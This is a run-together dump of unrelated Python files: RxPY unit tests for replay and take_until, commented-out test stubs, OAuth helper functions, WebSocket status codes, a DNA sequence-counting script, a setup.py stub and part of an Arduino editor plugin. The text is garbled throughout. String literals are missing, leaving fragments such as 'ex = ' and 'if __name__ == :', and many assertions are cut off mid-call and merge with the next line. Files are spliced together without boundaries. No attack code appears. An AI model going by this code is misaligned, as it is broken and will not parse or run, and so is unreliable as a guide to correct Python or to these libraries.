\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action6 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 7 ) , on_next ( 521 , 11 ) , on_next ( 561 , 20 ) , on_error ( xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 600 ) ) \n 
\n 
~~ def test_replay_time_complete ( self ) : \n 
~~~ subscription = [ None ] \n 
connection = [ None ] \n 
ys = [ None ] \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , None , 85 , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( disposed , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action6 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 6 ) , on_next ( 452 , 7 ) , on_next ( 521 , 11 ) , on_next ( 561 xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 600 ) ) \n 
\n 
~~ def test_replay_time_dispose ( self ) : \n 
~~~ subscription = [ None ] \n 
connection = [ None ] \n 
ys = [ None ] \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next results = scheduler . create_observer ( ) \n 
\n 
def action0 ( scheduler , state ) : \n 
~~~ ys [ 0 ] = xs . replay ( None , None , 100 , scheduler ) \n 
~~ scheduler . schedule_absolute ( created , action0 ) \n 
\n 
def action1 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] = ys [ 0 ] . subscribe ( results ) \n 
~~ scheduler . schedule_absolute ( 450 , action1 ) \n 
\n 
def action2 ( scheduler , state ) : \n 
~~~ subscription [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 475 , action2 ) \n 
\n 
def action3 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 300 , action3 ) \n 
\n 
def action4 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 400 , action4 ) \n 
\n 
def action5 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 500 , action5 ) \n 
\n 
def action6 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 550 , action6 ) \n 
\n 
def action7 ( scheduler , state ) : \n 
~~~ connection [ 0 ] = ys [ 0 ] . connect ( ) \n 
~~ scheduler . schedule_absolute ( 650 , action7 ) \n 
\n 
def action8 ( scheduler , state ) : \n 
~~~ connection [ 0 ] . dispose ( ) \n 
~~ scheduler . schedule_absolute ( 800 , action8 ) \n 
\n 
scheduler . start ( ) \n 
results . messages . assert_equal ( on_next ( 451 , 5 ) , on_next ( 452 , 6 ) , on_next ( 453 , 7 ) ) \n 
xs . subscriptions . assert_equal ( subscribe ( 300 , 400 ) , subscribe ( 500 , 550 ) , subscribe ( 650 , 800 ) ) \n 
~~ def test_replay_time_multiple_connections ( self ) : \n 
~~~ xs = Observable . never ( ) \n 
ys = xs . replay ( None , None , 100 ) \n 
connection1 = ys . connect ( ) \n 
connection2 = ys . connect ( ) \n 
assert ( connection1 == connection2 ) \n 
connection1 . dispose ( ) \n 
connection2 . dispose ( ) \n 
connection3 = ys . connect ( ) \n 
assert ( connection1 != connection3 ) \n 
\n 
~~ def test_replay_time_lambda_zip_complete ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next \n 
def create ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
~~ return xs . replay ( selector , None , 50 , scheduler ) \n 
\n 
~~ results = scheduler . start ( create , disposed = 610 ) \n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 600 ) ) \n 
\n 
~~ def test_replay_time_lambda_zip_error ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next \n 
def create ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
\n 
~~ return xs . replay ( selector , None , 50 , scheduler ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
\n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 600 ) ) \n 
\n 
~~ def test_replay_time_lambda_zip_dispose ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
xs = scheduler . create_hot_observable ( on_next ( 110 , 7 ) , on_next ( 220 , 3 ) , on_next ( 280 , 4 ) , on_next def create ( ) : \n 
~~~ def selector ( _xs ) : \n 
~~~ return _xs . take ( 6 ) . repeat ( ) \n 
~~ return xs . replay ( selector , None , 50 , scheduler ) \n 
\n 
~~ results = scheduler . start ( create , disposed = 470 ) \n 
results . messages . assert_equal ( on_next ( 221 , 3 ) , on_next ( 281 , 4 ) , on_next ( 291 , 1 ) , on_next ( 341 xs . subscriptions . assert_equal ( subscribe ( 200 , 470 ) ) \n 
\n 
~~ ~~ import unittest \n 
\n 
from rx import Observable \n 
from rx . testing import TestScheduler , ReactiveTest , is_prime , MockDisposable \n 
from rx . disposables import Disposable , SerialDisposable \n 
\n 
on_next = ReactiveTest . on_next \n 
on_completed = ReactiveTest . on_completed \n 
on_error = ReactiveTest . on_error \n 
subscribe = ReactiveTest . subscribe \n 
subscribed = ReactiveTest . subscribed \n 
disposed = ReactiveTest . disposed \n 
created = ReactiveTest . created \n 
\n 
class RxException ( Exception ) : \n 
~~~ pass \n 
\n 
# Helper function for raising exceptions within lambdas \n 
~~ def _raise ( ex ) : \n 
~~~ raise RxException ( ex ) \n 
\n 
~~ class TestTakeUntil ( unittest . TestCase ) : \n 
\n 
~~~ def test_take_until_preempt_somedata_next ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 , 5 r_msgs = [ on_next ( 150 , 1 ) , on_next ( 225 , 99 ) , on_completed ( 230 ) ] \n 
l = scheduler . create_hot_observable ( l_msgs ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_completed ( 225 ) ) \n 
\n 
~~ def test_take_until_preempt_somedata_error ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 , 5 r_msgs = [ on_next ( 150 , 1 ) , on_error ( 225 , ex ) ] \n 
l = scheduler . create_hot_observable ( l_msgs ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_error ( 225 , ex ) ) \n 
\n 
~~ def test_take_until_nopreempt_somedata_empty ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 , 5 r_msgs = [ on_next ( 150 , 1 ) , on_completed ( 225 ) ] \n 
l = scheduler . create_hot_observable ( l_msgs ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 \n 
~~ def test_take_until_nopreempt_somedata_never ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 , 5 l = scheduler . create_hot_observable ( l_msgs ) \n 
r = Observable . never ( ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 210 , 2 ) , on_next ( 220 , 3 ) , on_next ( 230 , 4 ) , on_next ( 240 \n 
~~ def test_take_until_preempt_never_next ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
r_msgs = [ on_next ( 150 , 1 ) , on_next ( 225 , 2 ) , on_completed ( 250 ) ] \n 
l = Observable . never ( ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_completed ( 225 ) ) \n 
\n 
~~ def test_take_until_preempt_never_error ( self ) : \n 
~~~ ex = \n 
scheduler = TestScheduler ( ) \n 
r_msgs = [ on_next ( 150 , 1 ) , on_error ( 225 , ex ) ] \n 
l = Observable . never ( ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_error ( 225 , ex ) ) \n 
\n 
~~ def test_take_until_nopreempt_never_empty ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
r_msgs = [ on_next ( 150 , 1 ) , on_completed ( 225 ) ] \n 
l = Observable . never ( ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( ) \n 
\n 
~~ def test_take_until_nopreempt_never_never ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l = Observable . never ( ) \n 
r = Observable . never ( ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( ) \n 
\n 
~~ def test_take_until_preempt_beforefirstproduced ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 230 , 2 ) , on_completed ( 240 ) ] \n 
r_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_completed ( 220 ) ] \n 
l = scheduler . create_hot_observable ( l_msgs ) \n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_completed ( 210 ) ) \n 
\n 
~~ def test_take_until_preempt_beforefirstproduced_remain_silent_and_proper_disposed ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_error ( 215 , ) , on_completed ( 240 ) ] \n 
r_msgs = [ on_next ( 150 , 1 ) , on_next ( 210 , 2 ) , on_completed ( 220 ) ] \n 
source_not_disposed = [ False ] \n 
\n 
def action ( ) : \n 
~~~ source_not_disposed [ 0 ] = True \n 
~~ l = scheduler . create_hot_observable ( l_msgs ) . do_action ( on_next = action ) \n 
\n 
r = scheduler . create_hot_observable ( r_msgs ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
\n 
results . messages . assert_equal ( on_completed ( 210 ) ) \n 
assert ( not source_not_disposed [ 0 ] ) \n 
\n 
~~ def test_take_until_nopreempt_afterlastproduced_proper_disposed_signal ( self ) : \n 
~~~ scheduler = TestScheduler ( ) \n 
l_msgs = [ on_next ( 150 , 1 ) , on_next ( 230 , 2 ) , on_completed ( 240 ) ] \n 
r_msgs = [ on_next ( 150 , 1 ) , on_next ( 250 , 2 ) , on_completed ( 260 ) ] \n 
signal_not_disposed = [ False ] \n 
l = scheduler . create_hot_observable ( l_msgs ) \n 
\n 
def action ( ) : \n 
~~~ signal_not_disposed [ 0 ] = True \n 
~~ r = scheduler . create_hot_observable ( r_msgs ) . do_action ( on_next = action ) \n 
\n 
def create ( ) : \n 
~~~ return l . take_until ( r ) \n 
\n 
~~ results = scheduler . start ( create ) \n 
results . messages . assert_equal ( on_next ( 230 , 2 ) , on_completed ( 240 ) ) \n 
assert ( not signal_not_disposed [ 0 ] ) \n 
\n 
~~ ~~ import logging \n 
from datetime import datetime , timedelta \n 
\n 
from rx import Observable \n 
from rx . testing import TestScheduler , ReactiveTest , is_prime , MockDisposable \n 
from rx . disposables import Disposable , SerialDisposable \n 
\n 
FORMAT = \n 
logging . basicConfig ( filename = , format = FORMAT , level = logging . DEBUG ) \n 
#logging.basicConfig(format=FORMAT, level=logging.DEBUG) \n 
log = logging . getLogger ( ) \n 
\n 
on_next = ReactiveTest . on_next \n 
on_completed = ReactiveTest . on_completed \n 
on_error = ReactiveTest . on_error \n 
subscribe = ReactiveTest . subscribe \n 
subscribed = ReactiveTest . subscribed \n 
disposed = ReactiveTest . disposed \n 
created = ReactiveTest . created \n 
\n 
class RxException ( Exception ) : \n 
~~~ pass \n 
\n 
# Helper function for raising exceptions within lambdas \n 
~~ def _raise ( ex ) : \n 
~~~ raise RxException ( ex ) \n 
\n 
\n 
\n 
# // TakeLastBuffer \n 
# def test_takeLastBuffer_with_time_Zero1(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_completed(230)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(0, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(230, function (lst) { \n 
#         return lst.length === 0 \n 
#     }), on_completed(230)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 230)) \n 
\n 
# def test_takeLastBuffer_with_time_Zero2(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(230)) #     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(0, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(230, function (lst) { \n 
#         return lst.length === 0 \n 
#     }), on_completed(230)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 230)) \n 
\n 
\n 
# function arrayEqual(arr1, arr2) { \n 
#     if (arr1.length != arr2.length) return false \n 
#     for (var i = 0, len = arr1.length i < len i++) { \n 
#         if (arr1[i] != arr2[i]) return false \n 
#     } \n 
#     return true \n 
# } \n 
\n 
# def test_takeLastBuffer_with_time_Some1(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(240)) #     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(25, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(240, function (lst) { \n 
#         return arrayEqual(lst, [2, 3]) \n 
#     }), on_completed(240)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 240)) \n 
\n 
# def test_takeLastBuffer_with_time_Some2(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(300)) #     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(25, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(300, function (lst) { \n 
#         return lst.length === 0 \n 
#     }), on_completed(300)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 300)) \n 
\n 
# def test_takeLastBuffer_with_time_Some3(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_next(240, 4), on_next(250, 5), on_next(260, 6), on_next(270, 7), on_next(280, 8), on_next(290, 9), on_completed(300)) #     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(45, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(300, function (lst) { \n 
#         return arrayEqual(lst, [6, 7, 8, 9]) \n 
#     }), on_completed(300)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 300)) \n 
\n 
# def test_takeLastBuffer_with_time_Some4(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(240, 2), on_next(250, 3), on_next(280, 4), on_next(290, 5), on_next(300, 6), on_completed(350)) #     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(25, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(350, function (lst) { \n 
#         return lst.length === 0 \n 
#     }), on_completed(350)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 350)) \n 
\n 
# def test_takeLastBuffer_with_time_All(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_completed(230)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(50, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(230, function (lst) { \n 
#         return arrayEqual(lst, [1, 2]) \n 
#     }), on_completed(230)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 230)) \n 
\n 
# def test_takeLastBuffer_with_time_Error(): \n 
#     var ex, res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
\n 
#     xs = scheduler.create_hot_observable(on_error(210, ex)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(50, scheduler) \n 
\n 
#     res.messages.assert_equal(on_error(210, ex)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 210)) \n 
\n 
# def test_takeLastBuffer_with_time_Never(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable() \n 
#     res = scheduler.start(create) \n 
#         return xs.takeLastBuffer_with_time(50, scheduler) \n 
\n 
#     res.messages.assert_equal() \n 
#     xs.subscriptions.assert_equal(subscribe(200, 1000)) \n 
\n 
# def test_Take_Zero(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_completed(230)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeWithTime(0, scheduler) \n 
\n 
#     res.messages.assert_equal(on_completed(201)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 201)) \n 
\n 
# def test_Take_Some(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(240)) #     res = scheduler.start(create) \n 
#         return xs.takeWithTime(25, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(210, 1), on_next(220, 2), on_completed(225)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 225)) \n 
\n 
# def test_Take_Late(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_completed(230)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeWithTime(50, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(210, 1), on_next(220, 2), on_completed(230)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 230)) \n 
\n 
# def test_Take_Error(): \n 
#     var ex, res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
\n 
#     xs = scheduler.create_hot_observable(on_error(210, ex)) \n 
#     res = scheduler.start(create) \n 
#         return xs.takeWithTime(50, scheduler) \n 
\n 
#     res.messages.assert_equal(on_error(210, ex)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 210)) \n 
\n 
# def test_Take_Never(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable() \n 
#     res = scheduler.start(create) \n 
#         return xs.takeWithTime(50, scheduler) \n 
\n 
#     res.messages.assert_equal(on_completed(250)) \n 
#     xs.subscriptions.assert_equal(subscribe(200, 250)) \n 
\n 
# def test_Take_Twice1(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_next(240, 4), on_next(250, 5), on_next(260, 6), on_completed(270)) #     res = scheduler.start(create) \n 
#         return xs.takeWithTime(55, scheduler).takeWithTime(35, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(235)) #     xs.subscriptions.assert_equal(subscribe(200, 235)) \n 
\n 
# def test_Take_Twice2(): \n 
#     var res, scheduler, xs \n 
#     scheduler = TestScheduler() \n 
#     xs = scheduler.create_hot_observable(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_next(240, 4), on_next(250, 5), on_next(260, 6), on_completed(270)) #     res = scheduler.start(create) \n 
#         return xs.takeWithTime(35, scheduler).takeWithTime(55, scheduler) \n 
\n 
#     res.messages.assert_equal(on_next(210, 1), on_next(220, 2), on_next(230, 3), on_completed(235)) #     xs.subscriptions.assert_equal(subscribe(200, 235)) \n 
\n 
\n 
\n 
\n 
# // TakeLast \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ test_buffer_with_time_or_count_basic ( ) \n 
~~ def prune_old_authorization_codes ( ) : \n 
~~~ """\n    Removes all unused and expired authorization codes from the database.\n    """ \n 
\n 
from . compat import now \n 
from . models import AuthorizationCode \n 
\n 
AuthorizationCode . objects . with_expiration_before ( now ( ) ) . delete ( ) \n 
\n 
\n 
~~ def get_handler ( handler_name ) : \n 
~~~ """\n    Imports the module for a DOAC handler based on the string representation of the module path that is provided.\n    """ \n 
\n 
from . conf import options \n 
\n 
handlers = options . handlers \n 
\n 
for handler in handlers : \n 
~~~ handler_path = handler . split ( "." ) \n 
name = handler_path [ - 2 ] \n 
\n 
if handler_name == name : \n 
~~~ handler_module = __import__ ( "." . join ( handler_path [ : - 1 ] ) , { } , { } , str ( handler_path [ - 1 ] ) ) \n 
\n 
return getattr ( handler_module , handler_path [ - 1 ] ) ( ) \n 
\n 
~~ ~~ return None \n 
\n 
\n 
~~ def request_error_header ( exception ) : \n 
~~~ """\n    Generates the error header for a request using a Bearer token based on a given OAuth exception.\n    """ \n 
\n 
from . conf import options \n 
\n 
header = "Bearer realm=\\"%s\\"" % ( options . realm , ) \n 
\n 
if hasattr ( exception , "error" ) : \n 
~~~ header = header + ", error=\\"%s\\"" % ( exception . error , ) \n 
\n 
~~ if hasattr ( exception , "reason" ) : \n 
~~~ header = header + ", error_description=\\"%s\\"" % ( exception . reason , ) \n 
\n 
~~ return header \n 
\n 
\n 
~~ def total_seconds ( delta ) : \n 
~~~ """\n    Get the total seconds that a `datetime.timedelta` object covers.  Used for returning the total\n    time until a token expires during the handshake process.\n    """ \n 
\n 
return delta . days * 86400 + delta . seconds \n 
# -*- coding: utf-8 -*- \n 
~~ """\n    WebSocket status codes and functions for work with them.\n\n    For more details check the link below:\n        https://tools.ietf.org/html/rfc6455\n""" \n 
__all__ = ( \n 
, , , \n 
, , , \n 
, , \n 
, , \n 
, , \n 
, \n 
\n 
, , , , \n 
) \n 
\n 
\n 
WS_NORMAL = 1000 \n 
WS_GOING_AWAY = 1001 \n 
WS_PROTOCOL_ERROR = 1002 \n 
WS_DATA_CANNOT_ACCEPT = 1003 \n 
WS_RESERVED = 1004 \n 
WS_NO_STATUS_CODE = 1005 \n 
WS_CLOSED_ABNORMALLY = 1006 \n 
WS_MESSAGE_NOT_CONSISTENT = 1007 \n 
WS_MESSAGE_VIOLATE_POLICY = 1008 \n 
WS_MESSAGE_TOO_BIG = 1009 \n 
WS_SERVER_DIDNT_RETURN_EXTENSIONS = 1010 \n 
WS_UNEXPECTED_CONDITION = 1011 \n 
WS_FAILURE_TLS = 1015 \n 
\n 
\n 
def is_not_used ( code ) : \n 
~~~ """Checking code, that is unused.\n\n    :param code: integer value.\n    """ \n 
return 0 <= code <= 999 \n 
\n 
\n 
~~ def is_reserved ( code ) : \n 
~~~ """Checking code, that is reserved.\n\n    :param code: integer value.\n    """ \n 
return 1000 <= code <= 2999 \n 
\n 
\n 
~~ def is_library ( code ) : \n 
~~~ """Checking code, that is value, used by libraries.\n\n    :param code: integer value.\n    """ \n 
return 3000 <= code <= 3999 \n 
\n 
\n 
~~ def is_private ( code ) : \n 
~~~ """Checking code, that is private code.\n\n    :param code: integer value.\n    """ \n 
return 4000 <= code <= 4999 \n 
# -*- coding: utf-8 -*- \n 
# store User and Token tables in the memory \n 
~~ DATABASES = { \n 
: { \n 
: , \n 
: \n 
} \n 
} \n 
#!/usr/bin/env python \n 
\n 
\n 
import sys \n 
import fileinput \n 
import itertools \n 
\n 
ALPHABET = ( "A" , "C" , "G" , "T" ) \n 
\n 
\n 
def sequence_count ( string , wordlength ) : \n 
~~~ """Return a frequency count of all sequences of a given size found in a string.\n    \n    \n    """ \n 
i = 0 \n 
wc = { } \n 
while i < len ( string ) - wordlength + 1 : \n 
~~~ word = string [ i : i + wordlength ] \n 
if word in wc : \n 
~~~ wc [ word ] += 1 \n 
~~ else : \n 
~~~ wc [ word ] = 1 \n 
~~ i += 1 \n 
~~ return wc \n 
\n 
\n 
\n 
~~ def pretty_print ( wordcount_dict , wordlength ) : \n 
~~~ """This prints out the wordcount index in order to mimic the R1.BAS output format.\n    """ \n 
output = "" \n 
e = 0 \n 
for w in itertools . product ( ALPHABET , repeat = wordlength ) : \n 
~~~ w = . join ( w ) \n 
try : \n 
~~~ output += "%3.10s%13s\\n" % ( e , wordcount_dict [ w ] ) \n 
~~ except IndexError : \n 
~~~ output += "%s\\t0\\n" \n 
~~ e += 1 \n 
~~ return output \n 
\n 
~~ def histogram ( filename , wordlength ) : \n 
~~~ """Returns a histogram report that meets NIHCC\'s format.\n\n    This function returns a string that is compatible with the example code\n    used Jim Deleo\'s Scientific Computing group at the NIH Clinical Center.\n    \'Pick a standard, any standard\', we\'ll we\'ve agreed to use this.\n    """ \n 
wc = { } \n 
for line in open ( filename ) . readlines ( ) : \n 
~~~ wcnew = sequence_count ( line , wordlength ) \n 
wc = { i : wc . get ( i , 0 ) + wcnew . get ( i , 0 ) for i in set ( wc ) | set ( wcnew ) } \n 
~~ return pretty_print ( wc , wordlength ) \n 
\n 
\n 
~~ if __name__ == "__main__" : \n 
~~~ print histogram ( sys . argv [ 1 ] , 3 ) \n 
\n 
~~ from setuptools import setup \n 
\n 
setup ( \n 
name = , \n 
version = , \n 
py_modules = [ ] , \n 
install_requires = [ \n 
, \n 
] , \n 
entry_points = , \n 
) \n 
#!/usr/bin/env python \n 
#-*- coding: utf-8 -*- \n 
\n 
# \n 
# Documents \n 
# \n 
\n 
"""\nDocuments\n""" \n 
\n 
from __future__ import absolute_import \n 
from __future__ import print_function \n 
from __future__ import division \n 
from __future__ import unicode_literals \n 
\n 
import os \n 
import shutil \n 
import sublime \n 
import re \n 
import zipfile \n 
import time \n 
\n 
from . import pyarduino \n 
from . import st_base \n 
from . import st_menu \n 
from . import st_console \n 
\n 
\n 
def set_pyarduino ( ) : \n 
~~~ user_path = st_base . get_stino_user_path ( ) \n 
package_path = st_base . get_plugin_path ( ) \n 
stino_path = os . path . join ( package_path , ) \n 
pyarduino_path = os . path . join ( stino_path , ) \n 
settings_path = os . path . join ( pyarduino_path , ) \n 
settings = pyarduino . base . settings . Settings ( settings_path ) \n 
settings . set ( , package_path ) \n 
settings . set ( , user_path ) \n 
\n 
\n 
~~ def load_keywords ( ) : \n 
~~~ arduino_info = st_base . get_arduino_info ( ) \n 
ide_dir = arduino_info . get_ide_dir ( ) \n 
keywords = ide_dir . get_keywords ( ) \n 
\n 
